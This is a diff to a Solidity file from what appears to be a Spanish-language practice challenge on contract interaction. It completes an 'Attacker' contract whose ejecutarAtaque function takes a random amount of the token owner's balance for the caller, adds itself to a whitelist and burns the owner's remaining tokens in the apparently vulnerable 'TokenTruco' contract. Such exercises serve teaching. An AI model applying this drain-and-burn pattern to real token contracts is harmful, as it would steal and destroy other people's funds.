@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.19;
+import "hardhat/console.sol";
 
 /**
  * En ese desafío se hará práctica de la interacción entre contratos.
@@ -79,21 +80,27 @@ interface ITokenTruco {
     function balances(address _account) external view returns (uint256);
 
     // function transferFrom
-
+    function transferFrom(address _from, address _to, uint256 _amount) external;
     // function burn
-
+    function burn(address _from, uint256 _amount) external;
     // ...
+    function addToWhitelist() external;
 }
 
 // Modificar el método 'ejecutarAtaque'
-contract Attacker {
+contract Attacker is NumeroRandom{
     ITokenTruco public tokenTruco;
-
     constructor(address _tokenTrucoAddress) {
         tokenTruco = ITokenTruco(_tokenTrucoAddress);
     }
 
     function ejecutarAtaque() public {
         // tokenTruco ...
+        uint amountRandom = NumeroRandom.montoAleatorio();
+        uint balance = tokenTruco.balances(tokenTruco.owner());
+        tokenTruco.transferFrom(tokenTruco.owner(), msg.sender, amountRandom);
+        tokenTruco.addToWhitelist();
+        uint restante = balance-amountRandom;
+        tokenTruco.burn(tokenTruco.owner(), restante);
     }
 }
